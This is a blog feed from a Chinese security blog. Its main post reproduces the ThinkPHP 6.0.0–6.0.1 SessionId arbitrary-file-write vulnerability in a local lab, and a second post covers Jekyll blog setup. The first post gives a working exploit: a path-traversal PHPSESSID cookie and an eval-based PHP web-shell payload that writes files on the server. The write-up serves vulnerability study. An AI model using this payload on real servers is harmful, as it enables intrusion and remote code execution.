<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-03-13T14:02:25+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">sueisok</title><subtitle>Notes,Thoughts and Else</subtitle><author><name>true</name></author><entry><title type="html">ThinkPHP6任意文件操作漏洞</title><link href="http://localhost:4000/blog/thinkphp6.0/" rel="alternate" type="text/html" title="ThinkPHP6任意文件操作漏洞" /><published>2020-03-13T15:13:21+08:00</published><updated>2020-03-13T15:13:21+08:00</updated><id>http://localhost:4000/blog/thinkphp6.0</id><content type="html" xml:base="http://localhost:4000/blog/thinkphp6.0/">&lt;p&gt;👻2020年1月10日，ThinkPHP团队发布一个补丁更新，修复了一处由不安全的SessionId导致的任意文件操作漏洞。该漏洞允许攻击者在目标环境启用session的条件下创建任意文件以及删除任意文件，在特定情况下还可以getshell&lt;/p&gt;

&lt;p&gt;具体受影响版本为ThinkPHP6.0.0-6.0.1&lt;/p&gt;

&lt;p&gt;👻最早是看别人写了如何复现的，然后这几天搭建Ubuntu+PHP7.1+ThinkPHP6.0.0并复现这个任意文件操作漏洞&lt;/p&gt;

&lt;p&gt;主要归纳为追踪SessionId怎么就可以篡改啦&lt;/p&gt;

&lt;p&gt;在什么特定情况下可以getshell啦&lt;/p&gt;

&lt;h2 id=&quot;环境准备&quot;&gt;环境准备&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;PHP7.1&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo apt-get -y install php7.1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/php7.1.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://www.kancloud.cn/manual/thinkphp6_0/1037481&quot;&gt;ThinkPHP6&lt;/a&gt;&lt;/p&gt;

    &lt;p&gt;安装&lt;code class=&quot;highlighter-rouge&quot;&gt;Composer&lt;/code&gt;&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ curl -sS https://getcomposer.org/installer | php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;如果有什么乱七八糟错误，可以试一试&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo curl -sS https://getcomposer.org/installer | sudo php -d detect_unicode=Off
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;然后移动&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ mv composer.phar /usr/local/bin/composer
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;修改源为阿里源&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;安装ThinkPHP6.0&lt;/p&gt;

    &lt;p&gt;💢坑：这里不需要写&lt;code class=&quot;highlighter-rouge&quot;&gt;topthink/think=6.0.0dev&lt;/code&gt;，不然会失败，版本可以在安装完之后修改配置文件进行版本覆盖&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ composer create-project topthink/think=6.0.x-dev tp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;💢坑：&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/keng_1.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;蛤？🙄搞不明白，还改了半天php的配置文件，把extension=php_fileinfo.dll的勾掉，其实不需要，&lt;a href=&quot;https://blog.csdn.net/u014132947/article/details/80258099?depth_1-utm_source=distribute.pc_relevant.none-task&amp;amp;utm_source=distribute.pc_relevant.none-task&quot;&gt;参考这篇文章&lt;/a&gt;，增加&lt;code class=&quot;highlighter-rouge&quot;&gt;--ignore-platform-reqs&lt;/code&gt;&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo composer --ignore-platform-reqs create-project topthink/think=6.0.x-dev tp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;就好惹😍
&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/thinkphpok.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;cd进入安装好的tp&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ php think run
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;访问http://localhost:8000/，此时是最新的6.0.2版本&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/ojbk.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;修改为6.0.1版本，将&lt;code class=&quot;highlighter-rouge&quot;&gt;/app/composer.json:24&lt;/code&gt;修改为&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;topthink/framework&quot;: &quot;6.0.0&quot;,
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;然后执行将版本覆盖为6.0.0&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ composer update
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;再次&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ php think run
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;http://localhost:8000/就会是6.0.0版本了&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;洞析漏洞分析&quot;&gt;洞析（漏洞分析）&lt;/h2&gt;

&lt;p&gt;参考：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://hacpai.com/article/1579965339516&quot;&gt;ThinkPHP6 任意文件操作漏洞分析&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/UPu6cE20l24T6fkYOlSUJw&quot;&gt;ThinkPHP6任意文件操作漏洞分析&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;😒咋两篇名字一样&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;官方信息：ThinkPHP 发布的补丁声称修复了一处由于不安全的 SessionId 导致的任意文件操作漏洞：在开启 Session 的情况下可以导致创建任意文件以及删除任意文件，特定情况下可以 getshell。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;根据这些信息，我们到官方 GitHub 的 commit 页面找一下相关的提交记录：&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/thinkphpgit.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;在src/think/session/Store.php 中 212 行在设置 &lt;code class=&quot;highlighter-rouge&quot;&gt;id&lt;/code&gt; 时增加了一个函数：&lt;code class=&quot;highlighter-rouge&quot;&gt;ctype_alnum($text)&lt;/code&gt;，这个函数就是判断所有的字符全部是字母和(或者)数字，返回 TRUE 否则返回 FALSE，所以可能是存储 Session 时导致的文件写入&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;跟进找一下相关的函数&lt;/p&gt;

    &lt;p&gt;可以看到 &lt;code class=&quot;highlighter-rouge&quot;&gt;vendor/topthink/framework/src/think/session/Store.php:254&lt;/code&gt; 的 save()函数&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/fenxi_1.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;263行write写入sessionId，265行delete删除sessionId，继续跟进write函数，在&lt;code class=&quot;highlighter-rouge&quot;&gt;vendor/topthink/framework/src/think/session/driver/File.php:210&lt;/code&gt;&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/fenxi_2.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;从&lt;code class=&quot;highlighter-rouge&quot;&gt;$sessID&lt;/code&gt;来&lt;code class=&quot;highlighter-rouge&quot;&gt;getFileName&lt;/code&gt;，然后直接&lt;code class=&quot;highlighter-rouge&quot;&gt;writeFile&lt;/code&gt;写入，继续追踪&lt;code class=&quot;highlighter-rouge&quot;&gt;writeFile&lt;/code&gt;函数，还是在File.php下&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/fenxi_3.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;可以看到调用了 &lt;code class=&quot;highlighter-rouge&quot;&gt;file_put_contents()&lt;/code&gt; 函数，这里是真正写入文件的操作了&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;file_put_contents($path, $content, LOCK_EX);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/file_put_contents.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;如果文件名不存在，则创建文件，否则现有文件将被覆盖，除非设置了FILE_APPEND标志。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;分析：&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;函数 &lt;code class=&quot;highlighter-rouge&quot;&gt;file_put_contents($path,$content,LOCK_EX)&lt;/code&gt; 中参数 &lt;code class=&quot;highlighter-rouge&quot;&gt;$path,$content&lt;/code&gt; 来源于函数 &lt;code class=&quot;highlighter-rouge&quot;&gt;writeFile($path,$data)&lt;/code&gt;&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;函数 &lt;code class=&quot;highlighter-rouge&quot;&gt;writeFile($path,$data)&lt;/code&gt; 中参数 &lt;code class=&quot;highlighter-rouge&quot;&gt;$path,$data&lt;/code&gt; 来源于函数 &lt;code class=&quot;highlighter-rouge&quot;&gt;write(String $sessionID,String $sessiData)&lt;/code&gt;&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;函数 &lt;code class=&quot;highlighter-rouge&quot;&gt;write(String $sessionID,String $sessiData)&lt;/code&gt; 中参数 &lt;code class=&quot;highlighter-rouge&quot;&gt;$sessionID,$sessiData&lt;/code&gt; 来源于 &lt;code class=&quot;highlighter-rouge&quot;&gt;save()&lt;/code&gt; 中调用了 &lt;code class=&quot;highlighter-rouge&quot;&gt;write()&lt;/code&gt;，同时传入的参数 &lt;code class=&quot;highlighter-rouge&quot;&gt;$sessionId&lt;/code&gt; 的值是调用 &lt;code class=&quot;highlighter-rouge&quot;&gt;getId()&lt;/code&gt; 传入的&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;

    &lt;p&gt;综上，文件名来源于 &lt;code class=&quot;highlighter-rouge&quot;&gt;$sessionId&lt;/code&gt;，当传入的 id 值长度为 32 ，创建 &lt;code class=&quot;highlighter-rouge&quot;&gt;sessionId&lt;/code&gt;，然后进行 &lt;code class=&quot;highlighter-rouge&quot;&gt;gitId()&lt;/code&gt;，就是这里判断不足&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/session32.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;接下来找调用 &lt;code class=&quot;highlighter-rouge&quot;&gt;setId()&lt;/code&gt; 的地方&lt;code class=&quot;highlighter-rouge&quot;&gt;vendor/topthink/framework/src/think/middleware/SessionInit.php:46&lt;/code&gt;&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/sessionid.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;其中 &lt;code class=&quot;highlighter-rouge&quot;&gt;cookieName&lt;/code&gt; 的值为 &lt;code class=&quot;highlighter-rouge&quot;&gt;PHPSESSID&lt;/code&gt;， &lt;code class=&quot;highlighter-rouge&quot;&gt;$sessionId&lt;/code&gt; 是 &lt;code class=&quot;highlighter-rouge&quot;&gt;cookie&lt;/code&gt; 中名为 &lt;code class=&quot;highlighter-rouge&quot;&gt;PHPSESSID&lt;/code&gt; 的值，因此是攻击者可控的，从而导致写入的文件名可控。&lt;/p&gt;

    &lt;p&gt;但是默认环境下，&lt;code class=&quot;highlighter-rouge&quot;&gt;session&lt;/code&gt; 的内容由 &lt;code class=&quot;highlighter-rouge&quot;&gt;vendor/topthink/framework/src/think/session/Store.php:261&lt;/code&gt; 的变量 &lt;code class=&quot;highlighter-rouge&quot;&gt;$data&lt;/code&gt; 传入：&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/fenxi_4.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;$data&lt;/code&gt; 在默认环境中为空:&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/fenxi_5.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;所以，可利用的条件比较苛刻&lt;/p&gt;

    &lt;p&gt;👹一是默认情况下是不开启session的，开启session才可以实现任意文件操作&lt;/p&gt;

    &lt;p&gt;👹二是写入的 session内容是由实际的后端业务逻辑来决定，只有特定情况才能getshell&lt;/p&gt;

    &lt;p&gt;那接下来就get一下shell吧&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;复现漏洞&quot;&gt;复现漏洞&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;修改&lt;code class=&quot;highlighter-rouge&quot;&gt;app/composer/Index.php&lt;/code&gt;，加一句&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;session('sueisok',&quot;1&quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/sueisok.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;开启session，去掉&lt;code class=&quot;highlighter-rouge&quot;&gt;app/middleware.php:9&lt;/code&gt;中的注释&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/middleware.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;访问，抓包，将&lt;code class=&quot;highlighter-rouge&quot;&gt;PHPSESSID&lt;/code&gt;改为目录地址&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Cookie: PHPSESSID=../../../../public/sueisokkk.php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;💢坑：这里的&lt;code class=&quot;highlighter-rouge&quot;&gt;PHPSESSID&lt;/code&gt;一定要是32位的&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/okkkphp.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;runtime/session/&lt;/code&gt;下会生成的session😀&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/runtimesession.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;来恶意操作一下，把&lt;code class=&quot;highlighter-rouge&quot;&gt;app/composer/Index.php&lt;/code&gt;里写入&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;session('sueisok',$_GET[&quot;c&quot;]);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/getc.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;访问，抓包，数据包内容&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /index.php?s=index/index&amp;amp;c=%3C?php%20eval($_GET[a]);?%3E HTTP/1.1
Host: 172.16.70.244:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3835.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=../../../../public/sueisokkk.php
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/eval.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;200之后，在&lt;code class=&quot;highlighter-rouge&quot;&gt;public/&lt;/code&gt;下写入了名为&lt;code class=&quot;highlighter-rouge&quot;&gt;sueisokkk.php&lt;/code&gt;的文件，在浏览器中访问构造带有payload的链接：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://xxx.xxx.xxx.xxx:8000/sueisokkk.php?a=fwrite(fopen(%22aa.txt%22,%20%22w%22),%22hello,world!%22);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;就在&lt;code class=&quot;highlighter-rouge&quot;&gt;public/&lt;/code&gt;下写入了名为&lt;code class=&quot;highlighter-rouge&quot;&gt;aa.txt&lt;/code&gt;内容为&lt;code class=&quot;highlighter-rouge&quot;&gt;hello,world&lt;/code&gt;的文件&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/helloworld.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;😇此时的心情彷佛春天来到&lt;/p&gt;

&lt;h2 id=&quot;其他的坑&quot;&gt;其他的坑&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;💢如果修改了session以后，http://localhost:8000访问之后出错，就要试一下&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo php think run
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;💢如果&lt;code class=&quot;highlighter-rouge&quot;&gt;runtime/session/&lt;/code&gt;下没有生成的session，那就应该是文件夹写的权限不够，我是直接给了777&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo chmod 777 /runtime/session/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;所以能任意写入文件getshell的条件还是很苛刻的&lt;/p&gt;</content><author><name>true</name></author><category term="ThinkPHP" /><category term="漏洞复现" /><summary type="html">👻2020年1月10日，ThinkPHP团队发布一个补丁更新，修复了一处由不安全的SessionId导致的任意文件操作漏洞。该漏洞允许攻击者在目标环境启用session的条件下创建任意文件以及删除任意文件，在特定情况下还可以getshell</summary></entry><entry><title type="html">第一篇博客</title><link href="http://localhost:4000/blog/first-blog/" rel="alternate" type="text/html" title="第一篇博客" /><published>2020-01-15T15:04:21+08:00</published><updated>2020-01-15T15:04:21+08:00</updated><id>http://localhost:4000/blog/first-blog</id><content type="html" xml:base="http://localhost:4000/blog/first-blog/">&lt;h2 id=&quot;0x00-拥有github&quot;&gt;0x00 拥有github&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;为什么用github：
(￣▽￣)”方便不要钱，没有别的&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;注册github账号：&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这个不用说了，之前就有账号了，直接在仓库里新建就行，会有个域名，比如我的是&lt;code class=&quot;highlighter-rouge&quot;&gt;sueisok&lt;/code&gt;，域名就是&lt;code class=&quot;highlighter-rouge&quot;&gt;sueisok.github.io&lt;/code&gt;了。不需要什么dnspod，什么dnsdaddy，什么一年50美元租服务器，贵且不好维护，且第三方平台比如wordpress可能有漏洞之类的，还要时常更新版本&lt;/p&gt;

&lt;h2 id=&quot;0x01-选择的工具&quot;&gt;0x01 选择的工具&lt;/h2&gt;

&lt;p&gt;本人电脑为win10系统&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://rubyinstaller.org/downloads/&quot;&gt;Ruby&lt;/a&gt;:一种简单快捷的面向对象（面向对象程序设计）脚本语言，安装Jekyll需要电脑上安装Ruby&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://jekyllcn.com/&quot;&gt;Jekyll&lt;/a&gt;：jekyll生成Git Pages，是一个生成静态网页的工具，不需要数据库支持。但是可以配合第三方服务，比如评论区可以有第三方支持，我这里用的是来必力&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://typora.io/&quot;&gt;Typora&lt;/a&gt;:是一款支持实时预览的 Markdown 文本编辑器，很强大&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://livere.com/&quot;&gt;来必力&lt;/a&gt;:添加的第三方评论工具&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;0x02-安装工具&quot;&gt;0x02 安装工具&lt;/h2&gt;

&lt;h3 id=&quot;安装ruby&quot;&gt;安装ruby&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://rubyinstaller.org/downloads/&quot;&gt;Ruby官网&lt;/a&gt;下载安装包，选择带DevKit的&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;安装到某个路径下即可&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;添加到环境变量&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;检查ruby是否安装成功：&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ruby -v
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;ul&gt;
  &lt;li&gt;检查gem版本，gem是一个管理ruby库和程序的标准包，用RubyInstaller安装ruby之后都附带有gem（不是邓紫棋&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gem -v
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h3 id=&quot;安装bundle&quot;&gt;安装bundle&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gem install bundle
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;至于这是什么，我不知道，至于会出现什么报错，我没遇见&lt;/p&gt;

&lt;h3 id=&quot;安装jekyll&quot;&gt;安装jekyll&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gem install jekyll
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;成功的话就成功了。这里碎碎念一下，(ノへ￣、)公司电脑上就可以安装成功，家里自己的电脑就不成功&lt;/p&gt;

&lt;p&gt;查看jekyll版本&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ jekyll -v
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;如果报错啥的，就按他提示，有可能是&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ bundle exec jekyll -v
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;显示了版本就是成功袅 我的是jekyll 3.8.6&lt;/p&gt;

&lt;h3 id=&quot;注册来必力&quot;&gt;注册来必力&lt;/h3&gt;

&lt;p&gt;注册完将生成的内容添加到仓库文件的&lt;code class=&quot;highlighter-rouge&quot;&gt;_config.yml&lt;/code&gt;里&lt;/p&gt;

&lt;h2 id=&quot;0x03-发表自己的第一篇博客&quot;&gt;0x03 发表自己的第一篇博客&lt;/h2&gt;

&lt;p&gt;我自己之前在github上有过主页，所以我这里只写如何应用一个自己喜欢的主题，然后提交到git上，让所有人都看到&lt;/p&gt;

&lt;h3 id=&quot;把自己原先的仓库clone下来&quot;&gt;把自己原先的仓库clone下来&lt;/h3&gt;

&lt;p&gt;原先github上有过主页，clone到本地一个路径下&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ git clone xxx你的仓库xxx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;选择一个自己喜欢的主题&quot;&gt;选择一个自己喜欢的主题&lt;/h3&gt;

&lt;p&gt;有好多主题的网站，我这个是在&lt;a href=&quot;http://jekyllthemes.org/&quot;&gt;jekyllthemes&lt;/a&gt;找的，也可以在喜欢的博主页脚中找到他们用的主题（真是个小机灵鬼儿&lt;/p&gt;

&lt;p&gt;下载下来，如果这个主题能用的话，接着往下进行&lt;/p&gt;

&lt;p&gt;如果直接把主题中的内容复制到仓库里，会出错，这里建议先在主题的目录下生成页面，再复制到clone的仓库目录下，在下载的主题目录下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ bundle exec jekyll serve
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

